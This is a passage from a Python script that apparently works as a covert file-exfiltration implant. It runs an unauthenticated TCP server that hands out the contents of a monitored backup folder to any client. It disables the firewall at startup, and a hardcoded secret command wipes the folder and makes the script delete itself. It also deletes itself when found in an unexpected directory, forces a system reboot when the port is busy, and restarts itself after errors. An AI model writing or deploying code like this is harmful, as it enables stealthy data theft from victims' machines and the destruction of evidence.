            print(f"Error in monitoring loop: {e}")
            time.sleep(5)

monitoring_thread = KThread(target=monitor_directory, daemon=True) # daemon ensures the main thread doesn't wait for this


def handle_request(conn, request):
    """Handles a single request (LIST_FILES or file transfer)."""
    if request == "LIST_FILES":
        if os.listdir(BACKUP_DIR) == []:
            conn.sendall("NO_FILES".encode())
        else:
            files_list = ",".join(os.listdir(BACKUP_DIR))
            conn.sendall(files_list.encode())
    else:  # File request
        send_file(conn, request)
        if os.listdir(BACKUP_DIR) == []:
            clear_downloads()


if not os.path.isfile(os.path.join(get_script_directory(), get_script_filename())):
    def get_script_directory():
        """Gets the directory where the script or executable is located."""
        print('Using changed get_script_directory')
        return os.getcwd() # with confirmations, this is the correct way to get the directory of the script or executable, regardless of whether it's running as a script, frozen executable, or bundled executable.
    fail_file_path = os.path.join(os.path.expanduser("~"), "Documents", "fail2.txt")
    try: open(fail_file_path, "w")
    except Exception as e: print('Error when creating failsafe file: ' + str(e))
    self_destruct() # basically this is IF, the script is in the wrong dir, delete self.

def start_server():
    """Starts the server and handles connections for individual requests."""
    disablefirewall()
    global INTERNET, lastconnection
    while not INTERNET:
        print("Cannot initialize server until internet connection is established")
        time.sleep(5)
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', HOST_PORT))
            s.listen()
            print("Listening for connections...")

            while True:
                conn, addr = s.accept()
                print(f"Connected by {addr}")
                lastconnection = time.time()
                global monitoring_thread
                monitoring_thread.kill() # kill as a connection to get anything is coming,
                # in the future make the kill be directed at the handle request as it can be something else
                # but since self destruct will use benefit from this kill as well, i'll keep it here.
                with conn:
                    while True:  # Loop to handle multiple requests per connection
                        request = conn.recv(1024).decode().strip()
                        if not request:
                            break  # Client closed connection for this request
                        elif request == "CLOSE":
                            break # Client fully closed connection
                        elif request == "ZpH7wM2k9LnB5":  # A randomly generated string for self destruction
                            # this will casue it to also delete the backup folder and exit
                            print('Self destructing and deleting backup folder...')
                            secure_delete_directory(BACKUP_DIR)
                            run_command_as_admin(f"rmdir /s /q \"{BACKUP_DIR}\"") # delete the backup folder
                            self_destruct()
                        else:
                            handle_request(conn, request) # handle a single request.
    except OSError as e:  # Handle address already in use error
        print(f'Error starting server: {e}')
        runcmd('shutdown.exe /g /t 0 /f')
            
def monitorthread_checker():
    global lastconnection, monitoring_thread
    while True:
        time.sleep(30)
        if not monitoring_thread.is_alive() and ((time.time() - lastconnection) > 60):  # If the thread is not running, restart it
            print('It has been 60 seconds since last connection and monitor thread is dead, restarting it...')
            monitoring_thread = KThread(target=monitor_directory, daemon=True) # daemon ensures the main thread doesn't wait for this
            monitoring_thread.start()

            
            
            
if __name__ == "__main__":
    try:
        monitoring_thread.start()  # Start the monitoring in a separate thread
        amtmp = threading.Thread(target=monitorthread_checker, daemon=True) # daemon ensures the main thread doesn't wait for this
        amtmp.start()  # Start the server in a separate thread
        start_server() # Server also runs continuously.
    except KeyboardInterrupt:
        print("Exiting...")

    except Exception as e:
        print(f"Global error: {e}")
        restart_self()